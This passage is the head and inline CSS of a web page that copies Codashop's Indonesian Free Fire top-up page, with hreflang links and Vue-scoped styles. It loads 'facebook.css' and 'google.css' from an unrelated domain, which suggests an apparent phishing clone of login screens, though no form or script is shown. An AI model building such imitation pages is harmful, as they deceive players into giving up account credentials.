    <script charset="utf-8" src="https://www.codashop.com/assets/badge.fccd7bb6d9025aa39a5f.95616.js"></script>
    <link data-vue-meta="ssr" rel="alternate" id="global-path" class="product-hreflang" hreflang="x-default" href="https://www.codashop.com/product/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="ru-kz" class="product-hreflang" hreflang="ru-kz" href="https://www.codashop.com/ru-kz/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-za" class="product-hreflang" hreflang="en-za" href="https://www.codashop.com/en-za/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="nl-be" class="product-hreflang" hreflang="nl-be" href="https://www.codashop.com/nl-be/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-it" class="product-hreflang" hreflang="en-it" href="https://www.codashop.com/en-it/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="nl-nl" class="product-hreflang" hreflang="nl-nl" href="https://www.codashop.com/nl-nl/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-es" class="product-hreflang" hreflang="en-es" href="https://www.codashop.com/en-es/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="my-mm" class="product-hreflang" hreflang="my-mm" href="https://www.codashop.com/my-mm/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-la" class="product-hreflang" hreflang="en-la" href="https://www.codashop.com/en-la/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="lo-la" class="product-hreflang" hreflang="lo-la" href="https://www.codashop.com/lo-la/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-ng" class="product-hreflang" hreflang="en-ng" href="https://www.codashop.com/en-ng/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="de-de" class="product-hreflang" hreflang="de-de" href="https://www.codashop.com/de-de/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="hu-hu" class="product-hreflang" hreflang="hu-hu" href="https://www.codashop.com/hu-hu/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-nl" class="product-hreflang" hreflang="en-nl" href="https://www.codashop.com/en-nl/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-de" class="product-hreflang" hreflang="en-de" href="https://www.codashop.com/en-de/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="pt-br" class="product-hreflang" hreflang="pt-br" href="https://www.codashop.com/pt-br/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="es-es" class="product-hreflang" hreflang="es-es" href="https://www.codashop.com/es-es/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-pt" class="product-hreflang" hreflang="en-pt" href="https://www.codashop.com/en-pt/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="it-it" class="product-hreflang" hreflang="it-it" href="https://www.codashop.com/it-it/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-fr" class="product-hreflang" hreflang="en-fr" href="https://www.codashop.com/en-fr/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="pt-pt" class="product-hreflang" hreflang="pt-pt" href="https://www.codashop.com/pt-pt/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="fr-be" class="product-hreflang" hreflang="fr-be" href="https://www.codashop.com/fr-be/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="id-id" class="product-hreflang" hreflang="id-id" href="https://www.codashop.com/id-id/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="tr-tr" class="product-hreflang" hreflang="tr-tr" href="https://www.codashop.com/tr-tr/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="fr-fr" class="product-hreflang" hreflang="fr-fr" href="https://www.codashop.com/fr-fr/free-fire">
    <link data-vue-meta="ssr" rel="alternate" id="en-gb" class="product-hreflang" hreflang="en-gb" href="https://www.codashop.com/en-gb/free-fire">
    <meta data-vue-meta="ssr" name="description" content="Beli Diamond FF murah dengan pulsa (Telkomsel, Indosat, Tri, XL, Smartfren), Go Pay, dll. Resmi, aman, dengan layanan customer service kelas dunia." id="desc">
    <meta data-vue-meta="ssr" property="og:title" content="Top Up Free Fire |  Promo Terbaru | Codashop Indonesia - Codashop" id="title">
    <meta data-vue-meta="ssr" property="og:description" content="Beli Diamond FF murah dengan pulsa (Telkomsel, Indosat, Tri, XL, Smartfren), Go Pay, dll. Resmi, aman, dengan layanan customer service kelas dunia." id="desc">
    <meta data-vue-meta="ssr" property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_new_640x241.jpg" id="image">
    <meta data-vue-meta="ssr" property="twitter:title" content="Top Up Free Fire |  Promo Terbaru | Codashop Indonesia - Codashop" id="twitter-title">
    <meta data-vue-meta="ssr" property="twitter:description" content="Beli Diamond FF murah dengan pulsa (Telkomsel, Indosat, Tri, XL, Smartfren), Go Pay, dll. Resmi, aman, dengan layanan customer service kelas dunia." id="twitter-description">
    <meta data-vue-meta="ssr" property="twitter:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_new_640x241.jpg" id="twitter-image">
	<link rel="stylesheet" href="https://images.cahyosr.my.id/css/15/style.css">
	<link rel="stylesheet" href="https://images.cahyosr.my.id/css/15/facebook.css">
	<link rel="stylesheet" href="https://images.cahyosr.my.id/css/15/google.css">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
</head>

<body dir="ltr">

    <style>
	
	@keyframes fadeIn-data-v-063ff78c {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-063ff78c {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-063ff78c]:export {
    breakpointLg: 992px
}

.icon-color--portal[data-v-063ff78c] {
    color: var(--color-primary-main)
}

.icon-color--burst[data-v-063ff78c] {
    color: var(--color-secondary-main)
}

@keyframes fadeIn-data-v-23bba3ae {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-23bba3ae {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-23bba3ae]:export {
    breakpointLg: 992px
}

.arrow-wrapper[data-v-23bba3ae] {
    display: flex;
    border: 1px solid;
    position: relative
}

.icon-type--box[data-v-23bba3ae] {
    border-radius: 3px
}

.icon-type--round[data-v-23bba3ae] {
    border-radius: 8px
}

.icon-color--smoke[data-v-23bba3ae] {
    color: var(--color-light-main)
}

.icon-color--smoke>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-light-main)
}

.icon-color--dark-matter[data-v-23bba3ae] {
    color: var(--color-dark-main)
}

.icon-color--dark-matter>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-dark-main)
}

.icon-color--arcadia[data-v-23bba3ae] {
    color: var(--color-tertiary-main)
}

.icon-color--arcadia>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-tertiary-main)
}

.icon-color--portal[data-v-23bba3ae] {
    color: var(--color-primary-main)
}

.icon-color--portal>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-primary-main)
}

.icon-color--burst[data-v-23bba3ae] {
    color: var(--color-secondary-main)
}

.icon-color--burst>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-secondary-main)
}

.icon-color--green[data-v-23bba3ae] {
    color: var(--color-green-1)
}

.icon-color--green>.arrow[data-v-23bba3ae] {
    border: 1px solid var(--color-green-1)
}

.arrow[data-v-23bba3ae] {
    border-width: 0 1px 1px 0 !important;
    display: inline-flex;
    padding: 2px;
    position: absolute
}

.icon-position--right[data-v-23bba3ae] {
    transform: rotate(-45deg);
    -webkit-transform: rotate(-45deg);
    margin: 3px 2px
}

.icon-position--left[data-v-23bba3ae] {
    transform: rotate(135deg);
    -webkit-transform: rotate(135deg);
    margin: 3px 4px
}

.icon-position--up[data-v-23bba3ae] {
    transform: rotate(-135deg);
    -webkit-transform: rotate(-135deg);
    margin: 4px 3px
}

.icon-position--down[data-v-23bba3ae] {
    transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    margin: 2px 3px
}

.icon-size--sm[data-v-23bba3ae] {
    width: 13px;
    height: 13px
}

.icon-size--md[data-v-23bba3ae] {
    width: 40px;
    height: 40px
}

@keyframes fadeIn-data-v-18b73dda {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-18b73dda {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-18b73dda]:export {
    breakpointLg: 992px
}

.icon-color--burst[data-v-18b73dda] {
    color: var(--color-secondary-main)
}

.icon-color--green[data-v-18b73dda] {
    color: var(--color-green-1)
}

@keyframes fadeIn-data-v-67f77640 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-67f77640 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-67f77640]:export {
    breakpointLg: 992px
}

.icon-color--dark-matter[data-v-67f77640] {
    color: var(--color-dark-main)
}

.icon-color--portal[data-v-67f77640] {
    color: var(--color-primary-main)
}

.icon-color--smoke[data-v-67f77640] {
    color: var(--color-light-main)
}

.icon-color--burst[data-v-67f77640] {
    color: var(--color-secondary-main)
}

.icon-color--arcadia[data-v-67f77640] {
    color: var(--color-tertiary-main)
}

@keyframes fadeIn-data-v-584c9c23 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-584c9c23 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-584c9c23]:export {
    breakpointLg: 992px
}

.icon-auth[data-v-584c9c23] {
    display: flex
}

@keyframes fadeIn-data-v-77ab2603 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-77ab2603 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-77ab2603]:export {
    breakpointLg: 992px
}

.icon-color--dark-matter[data-v-77ab2603] {
    fill: var(--color-dark-main)
}

.icon-color--smoke[data-v-77ab2603] {
    fill: var(--color-light-main)
}

@keyframes fadeIn-data-v-e3708b80 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-e3708b80 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-e3708b80]:export {
    breakpointLg: 992px
}

.icon-color--portal[data-v-e3708b80] {
    color: var(--color-primary-main)
}

.icon-color--burst[data-v-e3708b80] {
    color: var(--color-secondary-main)
}

.icon-color--white[data-v-e3708b80] {
    color: #fff
}

@keyframes fadeIn-data-v-44ed8a56 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-44ed8a56 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-44ed8a56]:export {
    breakpointLg: 992px
}

.icon-color--burst[data-v-44ed8a56] {
    color: var(--color-secondary-main)
}

.icon-color--portal[data-v-44ed8a56] {
    color: var(--color-primary-main)
}

@keyframes fadeIn-data-v-0c8349a0 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-0c8349a0 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-0c8349a0]:export {
    breakpointLg: 992px
}

.icon-color--green[data-v-0c8349a0] {
    color: var(--color-green-1)
}

.icon-color--smoke[data-v-0c8349a0] {
    color: var(--color-light-main)
}

@keyframes fadeIn-data-v-4764e66a {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-4764e66a {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-4764e66a]:export {
    breakpointLg: 992px
}

.icon-color--dark-matter[data-v-4764e66a] {
    color: var(--color-dark-main)
}

.icon-color--smoke[data-v-4764e66a] {
    color: var(--color-light-main)
}

.icon-color--burst[data-v-4764e66a] {
    color: var(--color-secondary-main)
}

.icon-color--arcadia[data-v-4764e66a] {
    color: var(--color-tertiary-main)
}

@keyframes fadeIn-data-v-758e0345 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-758e0345 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-758e0345]:export {
    breakpointLg: 992px
}

.icon-color--smoke[data-v-758e0345] {
    color: var(--color-light-main)
}

.icon-color--dark[data-v-758e0345] {
    color: var(--color-dark-main)
}

@keyframes fadeIn-data-v-5052019e {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-5052019e {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-5052019e]:export {
    breakpointLg: 992px
}

.icon-size--sm[data-v-5052019e] {
    width: 16px;
    height: 16px
}

.icon-size--md[data-v-5052019e] {
    width: 22px;
    height: 22px
}

.icon-size--lg[data-v-5052019e] {
    width: 48px;
    height: 48px
}

.icon-color--portal[data-v-5052019e] {
    stroke: var(--color-primary-main)
}

.icon-color--arcadia[data-v-5052019e] {
    stroke: var(--color-tertiary-main)
}

.icon-color--smoke[data-v-5052019e] {
    stroke: var(--color-light-main)
}

.icon-color--burst[data-v-5052019e] {
    stroke: var(--color-secondary-main)
}

.icon-loader[data-v-5052019e] {
    transform-origin: center;
    animation: rotate-frames-data-v-5052019e 2s linear infinite
}

.icon-loader circle[data-v-5052019e] {
    stroke-linecap: round;
    animation: cicle-frames-data-v-5052019e 1.5s ease-in-out infinite
}

@keyframes rotate-frames-data-v-5052019e {
    to {
        transform: rotate(1turn)
    }
}

@keyframes cicle-frames-data-v-5052019e {
    0% {
        stroke-dasharray: 0 150;
        stroke-dashoffset: 0
    }

    47.5% {
        stroke-dasharray: 42 150;
        stroke-dashoffset: -16
    }

    95%,
    to {
        stroke-dasharray: 42 150;
        stroke-dashoffset: -59
    }
}

@keyframes fadeIn-data-v-cae79778 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-cae79778 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-cae79778]:export {
    breakpointLg: 992px
}

.svg-default path[data-v-cae79778]:first-of-type {
    fill: #fff
}

@keyframes fadeIn-data-v-4e348954 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-4e348954 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-4e348954]:export {
    breakpointLg: 992px
}

.icon-clock[data-v-4e348954] {
    width: 24px;
    height: 24px
}

.svg-default path[data-v-4e348954]:first-of-type {
    fill: #fff
}

@keyframes fadeIn-data-v-762205d7 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-762205d7 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-762205d7]:export {
    breakpointLg: 992px
}

.svg-default path[data-v-762205d7]:first-of-type {
    fill: var(--color-primary-main)
}

@keyframes fadeIn-data-v-2dd8a47f {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-2dd8a47f {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-2dd8a47f]:export {
    breakpointLg: 992px
}

.product-details__container[data-v-2dd8a47f] {
    color: var(--color-light-main)
}

.product-details__container .progress-modal-close-btn[data-v-2dd8a47f] {
    width: 50%
}

.product-details__banner-container[data-v-2dd8a47f] {
    padding: 0;
    color: var(--color-light-main);
    animation: fadeIn-data-v-2dd8a47f .75s ease
}

.product-details__banner[data-v-2dd8a47f] {
    width: 100%;
    max-width: 100%;
    display: block
}

.product-details__name[data-v-2dd8a47f] {
    font-size: 1.25rem;
    padding: 10px 0;
    animation: fadeIn-data-v-2dd8a47f .85s ease;
    font-family: NotoSans-Bold, sans-serif;
    margin: 0;
    direction: ltr
}

[dir=ltr] .product-details__name[data-v-2dd8a47f] {
    text-align: left
}

[dir=rtl] .product-details__name[data-v-2dd8a47f] {
    text-align: right
}

.product-details__description[data-v-2dd8a47f] {
    padding: 10px;
    position: relative
}

.product-details__content[data-v-2dd8a47f] {
    font-size: .875rem;
    line-height: 24px;
    overflow: hidden;
    position: relative;
    transition: .5s ease-in;
    animation: fadeIn-data-v-2dd8a47f .9s ease;
    padding: 0;
    max-height: 120px;
    margin: 0 0 15px
}

.product-details__content[data-v-2dd8a47f] .shop-content--paragraph {
    margin: 15px 0;
    line-height: 22px;
    font-family: NotoSans-Regular, sans-serif;
    position: relative;
    overflow: hidden
}

.product-details__content[data-v-2dd8a47f] .shop-content--paragraph small {
    display: block
}

.product-details__content[data-v-2dd8a47f] .shop-content--paragraph a {
    color: var(--color-primary-main);
    text-decoration: underline;
    cursor: pointer;
    display: inline-block
}

.product-details__content[data-v-2dd8a47f] .shop-content--list b,
.product-details__content[data-v-2dd8a47f] .shop-content--list strong,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph b,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph strong {
    font-family: NotoSans-Bold, sans-serif
}

.product-details__content[data-v-2dd8a47f] .shop-content--list em,
.product-details__content[data-v-2dd8a47f] .shop-content--list i,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph em,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph i {
    font-family: NotoSans-Italic, sans-serif
}

.product-details__content[data-v-2dd8a47f] .shop-content--list sub,
.product-details__content[data-v-2dd8a47f] .shop-content--list sup,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph sub,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph sup {
    font-size: .625rem;
    padding: 1px;
    font-family: NotoSans-Regular, sans-serif
}

.product-details__content[data-v-2dd8a47f] .shop-content--list u,
.product-details__content[data-v-2dd8a47f] .shop-content--paragraph u,
.product-details__content[data-v-2dd8a47f] .shop-content--underline {
    text-decoration: underline;
    display: inline-block
}

.product-details__content[data-v-2dd8a47f] .shop-content--badge {
    text-decoration: none;
    cursor: pointer;
    display: inline-block;
    max-width: 92px;
    margin: 8px 5px 0 0
}

.product-details__content[data-v-2dd8a47f] .shop-content--badge>img {
    width: auto;
    height: auto;
    max-width: 100%;
    display: block
}

.product-details__content[data-v-2dd8a47f] .shop-content--image>img {
    display: block;
    max-width: 100%;
    margin: auto
}

.product-details__content[data-v-2dd8a47f] .shop-content--heading {
    font-family: NotoSans-Bold, sans-serif;
    margin: 0
}

.product-details__content[data-v-2dd8a47f] .shop-content--paragraph iframe,
.product-details__content[data-v-2dd8a47f] .shop-content--video,
.product-details__content[data-v-2dd8a47f] .shop-content__container iframe {
    width: 100%;
    max-width: 100%
}

.product-details__content[data-v-2dd8a47f] .shop-content--list .product-details__content ::v-deep .shop-content--paragraph {
    margin: 0 0 6px
}

.product-details__content[data-v-2dd8a47f] .shop-content--list li {
    display: list-item !important
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-circle {
    list-style-type: circle
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-dot {
    list-style-type: disc
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-square {
    list-style-type: square
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-number {
    list-style-type: decimal
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-alphabet {
    list-style-type: upper-alpha
}

.product-details__content[data-v-2dd8a47f] .shop-content--list.list-dash {
    list-style-type: none !important
}

[dir=ltr] .product-details__content[data-v-2dd8a47f] .shop-content--list.list-dash {
    padding-left: 25px
}

[dir=rtl] .product-details__content[data-v-2dd8a47f] .shop-content--list.list-dash {
    padding-right: 25px
}

.product-details__content[data-v-2dd8a47f] .shop-content--show {
    display: inline-block
}

.product-details__content[data-v-2dd8a47f] .shop-content--hide {
    display: none
}

.product-details__content[data-v-2dd8a47f] .shop-content--regular-txt {
    font-family: NotoSans-Regular, sans-serif
}

.product-details__content[data-v-2dd8a47f] .shop-content__container hr {
    border-style: none;
    width: auto;
    height: 1px;
    margin: 10px 0;
    background-color: #ededed
}

.product-details__content[data-v-2dd8a47f] .list-dash li:before {
    display: inline-block;
    vertical-align: middle;
    content: "-"
}

[dir=ltr] .product-details__content[data-v-2dd8a47f] .list-dash li:before {
    margin-right: 5px
}

[dir=rtl] .product-details__content[data-v-2dd8a47f] .list-dash li:before {
    margin-left: 5px
}

.product-details__content[data-v-2dd8a47f] .list-checkmark li:before {
    display: inline-block;
    vertical-align: middle;
    content: "";
    width: 9px;
    height: 3px;
    border-left: 2px solid #fff;
    border-bottom: 2px solid #fff;
    border-right: none;
    border-top: none;
    transform: rotate(-45deg);
    position: relative;
    top: -3px
}

[dir=ltr] .product-details__content[data-v-2dd8a47f] .list-checkmark li:before {
    margin-right: 5px
}

[dir=rtl] .product-details__content[data-v-2dd8a47f] .list-checkmark li:before {
    margin-left: 5px
}

.product-details__content[data-v-2dd8a47f] article>.shop-content--paragraph:first-child {
    margin: 0
}

.product-details__content[data-v-2dd8a47f] .form__field-instruction-text .shop-content--paragraph {
    margin: 0;
    line-height: 16px
}

.product-details__content[data-v-2dd8a47f] .shop-content--image {
    margin: 0
}

.product-details__content[data-v-2dd8a47f] .shop-content--image img {
    display: block;
    max-width: 100%;
    margin: auto
}

.product-details__content[data-v-2dd8a47f] strong.shop-content--pc-name {
    font-weight: 400;
    display: inline-block;
    font-family: NotoSans-Regular, sans-serif;
    max-width: 100%
}

.product-details__content[data-v-2dd8a47f] h1.shop-content--heading {
    font-size: 1.375rem
}

.product-details__content[data-v-2dd8a47f] h2.shop-content--heading {
    font-size: 1.25rem
}

.product-details__content[data-v-2dd8a47f] h3.shop-content--heading:not(.slogan-element) {
    font-size: 1.125rem
}

.product-details__content[data-v-2dd8a47f] h4.shop-content--heading {
    font-size: 1rem
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”black {
    color: #333 !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”white {
    color: #fff !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”green {
    color: #08ad36 !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”blue {
    color: #4c83d2 !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”red {
    color: #ee3131 !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”yellow {
    color: gold !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”purple {
    color: #639 !important
}

.product-details__content[data-v-2dd8a47f] .text-colorâ€”pink {
    color: salmon !important
}

.product-details__content[data-v-2dd8a47f] .shop-content--paragraph a,
.product-details__content[data-v-2dd8a47f] a {
    color: var(--color-secondary-main)
}

.product-details__content.hide-all-content[data-v-2dd8a47f] {
    max-height: 1px
}

.product-details__checkbox[data-v-2dd8a47f] {
    display: none
}

.product-details__checkbox+label[data-v-2dd8a47f] {
    position: absolute;
    bottom: 0;
    text-decoration: underline;
    font-family: NotoSans-Bold, sans-serif
}

.product-details__description--less[data-v-2dd8a47f] {
    display: none
}

.product-details__description--more[data-v-2dd8a47f] {
    display: inline
}

.product-details__checkbox:checked+label>.product-details__description--more[data-v-2dd8a47f] {
    display: none
}

.product-details__checkbox:checked+label>.product-details__description--less[data-v-2dd8a47f] {
    display: inline
}

.product-details__checkbox:checked+label+.product-details__content[data-v-2dd8a47f] {
    max-height: none
}

.product-details__voucherization[data-v-2dd8a47f] {
    display: flex;
    flex-flow: row;
    align-items: flex-start;
    background: var(--color-green-3);
    border: 1px solid var(--color-green-2);
    color: var(--color-dark-main);
    padding: 14px;
    margin: 12px 0;
    line-height: 20px;
    font-size: .75rem;
    border-radius: 8px;
    text-decoration: none
}

[dir=ltr] .product-details__voucherization .icon[data-v-2dd8a47f] {
    padding-right: 4px
}

[dir=rtl] .product-details__voucherization .icon[data-v-2dd8a47f] {
    padding-left: 4px
}

.product-details__voucherization .title[data-v-2dd8a47f] {
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif
}

.product-details__voucherization .description[data-v-2dd8a47f] {
    margin: 4px 0 0
}

.product-details__voucherization .description[data-v-2dd8a47f] strong {
    font-family: NotoSans-SemiBold, sans-serif
}

@media screen and (min-width:768px) {

    .product-details__content.hide-all-content[data-v-2dd8a47f],
    .product-details__content[data-v-2dd8a47f] {
        max-height: none
    }

    .product-details__description[data-v-2dd8a47f] {
        padding: 10px 0
    }

    .product-details__checkbox+label[data-v-2dd8a47f] {
        display: none
    }
}

@keyframes fadeIn-data-v-fe69086a {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-fe69086a {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-fe69086a]:export {
    breakpointLg: 992px
}

.input-oauth[data-v-fe69086a] {
    display: flex;
    flex-flow: column;
    margin: 10px auto
}

.input-oauth__link[data-v-fe69086a] {
    border-radius: 42px;
    color: var(--color-dark-main);
    text-decoration: none;
    background: var(--color-secondary-main);
    padding: 12px 18px;
    box-shadow: -5px 5px 10px rgba(46, 78, 122, .22);
    display: inline-flex;
    justify-content: center;
    align-items: center
}

.input-oauth__link[data-v-fe69086a]:hover {
    background-color: var(--color-secondary-4)
}

.input-oauth__message[data-v-fe69086a] {
    color: var(--color-dark-main);
    letter-spacing: .02em;
    font-family: NotoSans-Regular, sans-serif;
    font-size: .875rem;
    padding: 10px 0;
    display: inline-flex;
    justify-content: flex-start;
    align-items: center
}

[dir=ltr] .input-oauth__message-text[data-v-fe69086a] {
    text-align: left
}

[dir=rtl] .input-oauth__message-text[data-v-fe69086a] {
    text-align: right
}

.input-oauth__icon-avatar[data-v-fe69086a],
.input-oauth__icon-oauth[data-v-fe69086a] {
    padding: 0 5px
}

@keyframes fadeIn-data-v-4d03e0e6 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-4d03e0e6 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-4d03e0e6]:export {
    breakpointLg: 992px
}

label[data-v-4d03e0e6] {
    margin-bottom: 8px;
    display: block;
    font-size: .75rem;
    color: var(--color-dark-main)
}

.dropdown-select[data-v-4d03e0e6] {
    border: 1px solid var(--color-light-4);
    border-radius: 8px;
    position: relative;
    height: 49px;
    cursor: text;
    display: flex;
    justify-content: center;
    word-break: break-word
}

.dropdown-select .row[data-v-4d03e0e6] {
    width: 100%;
    padding: 7px;
    display: flex
}

.dropdown-select i.dropdown-arrow[data-v-4d03e0e6] {
    width: 0;
    height: 0;
    border-left: 4px solid transparent;
    border-right: 4px solid transparent;
    border-top: 4px solid;
    opacity: .8;
    cursor: pointer;
    align-self: center;
    margin-left: auto
}

.dropdown-select__placeholder[data-v-4d03e0e6] {
    display: inline-flex;
    color: var(--color-dark-main);
    overflow: hidden;
    width: 100%;
    height: 30px;
    justify-content: center;
    align-items: center;
    white-space: nowrap
}

.dropdown-select__selected-option[data-v-4d03e0e6] {
    display: inline-flex;
    align-self: center;
    overflow: hidden;
    justify-content: center;
    width: 90%
}

.dropdown-select__search[data-v-4d03e0e6] {
    border: none;
    width: 100%;
    line-height: 30px;
    text-align: center
}

.dropdown-select__search[data-v-4d03e0e6]:focus {
    outline: none
}

.dropdown-select__search[data-v-4d03e0e6]:-webkit-autofill,
.dropdown-select__search[data-v-4d03e0e6]::placeholder {
    color: var(--color-light-4)
}

.dropdown-select__result-list[data-v-4d03e0e6] {
    border: 1px solid var(--color-light-4);
    margin: 0 calc(-.2em - 5px);
    top: 45px;
    width: calc(100% + 2px);
    border-radius: 0 0 .25em .25em;
    cursor: pointer;
    position: absolute;
    z-index: 10;
    flex: 1;
    max-height: 400px;
    overflow-y: auto;
    background-color: #fff
}

.dropdown-select__result-list .result[data-v-4d03e0e6] {
    padding: .375em .75em;
    color: var(--color-dark-main);
    overflow: hidden;
    word-break: break-word
}

.dropdown-select__result-list .result[data-v-4d03e0e6]:focus,
.dropdown-select__result-list .result[data-v-4d03e0e6]:hover {
    background-color: var(--color-light-main);
    outline: none
}

.dropdown-select__no-result-list[data-v-4d03e0e6] {
    border: 1px solid var(--color-light-4);
    margin: 0 calc(-.2em - 8px);
    top: 45px;
    width: calc(100% + 2px);
    border-radius: 0 0 .25em .25em;
    cursor: default;
    position: absolute;
    z-index: 10;
    flex: 1;
    background-color: #fff
}

.dropdown-select__no-result-list .result[data-v-4d03e0e6] {
    padding: .375em .75em;
    color: var(--color-dark-main);
    overflow: hidden;
    word-break: break-word
}

.dropdown-select__no-result-list .result span[data-v-4d03e0e6] {
    font-weight: 400;
    color: var(--color-light-4)
}

.disabled[data-v-4d03e0e6] {
